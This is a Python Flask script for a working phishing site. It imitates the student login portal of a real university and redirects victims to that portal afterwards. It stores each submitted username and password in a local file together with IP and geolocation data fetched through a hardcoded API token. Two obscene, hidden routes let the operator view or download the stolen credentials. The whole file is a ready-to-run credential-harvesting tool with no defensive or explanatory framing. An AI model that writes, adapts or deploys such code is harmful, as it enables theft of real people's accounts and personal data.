from flask import Flask, redirect, request, send_file
import requests

app = Flask(__name__)
true_site = 'https://etu.univ-lome.tg'
page = """
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Portail Université</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    width: 300px;
                    text-align: center;
                }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border-radius: 4px;
                    border: 1px solid #ccc;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    color: white;
                    padding: 10px;
                    width: 100%;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #45a049;
                }
                .error {
                    color: red;
                    margin-bottom: 10px;
                }
            </style>
        </head>
        <body>
        
        <div class="container">
            <h2>Connexion</h2>
            <div class="error">Identifiant ou mot de passe invalide</div>
            <form action=/login method="post">
                <input type="text" name="username" placeholder="Identifiant" required>
                <input type="password" name="password" placeholder="Mot de passe" required>
                <input type="submit" value="connexion">
            </form>
            <br>
            <a href="#">Mot de passe oublié</a>
            <br>
            <a href="#">Identifiant oublié</a>
        </div>
        
        </body>
        </html>
"""


@app.route('/')
def home():
    return page

def write_info(username, password):
    with open("./info.txt", 'a') as f:
        f.write(f'Name:{username}\t|password:{password}\n')

@app.route('/login', methods=['POST'])
def login():
    #Recolte d'info
    username = request.form['username']
    password = request.form['password']

    #Capture de l'address IP
    try:
        ip_address = requests.get('https://api.ipify.org').text
    except:
        write_info(username, password)
        return redirect(true_site)
    access_token = "4e75820f33ba3b"

    #Demande de géolocalisation
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}?token={access_token}")
        #raise ConnectionError
    except:
        write_info(username, password)
        return redirect(true_site)
    location_info = response.json()

    #Recolte d'info
    city = location_info.get('city')
    region = location_info.get('region')
    country = location_info.get('country')
    loc = location_info.get('loc')

    #Enregistrez dans un fichier
    with open("./info.txt", 'a') as f:
        f.write(f'Name:{username}\t|password:{password}\t|IP: {ip_address}\t|City:{city}\t|Country:{country}\t|Region:{region}\t|Location: {loc}\n')

    #Redirection vers le vrai site
    return redirect(true_site)

@app.route('/fuck')
def download():
    try:
        return send_file('../info.txt', as_attachment=True)
    except FileNotFoundError:
        return "Fichier inexistant"

@app.route('/fucksee')
def see():
    try:
        with open('./info.txt', 'r') as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    except FileNotFoundError:
        return "Fichier inexistant Ok"


if __name__ == '__main__':
    app.run(debug=True)
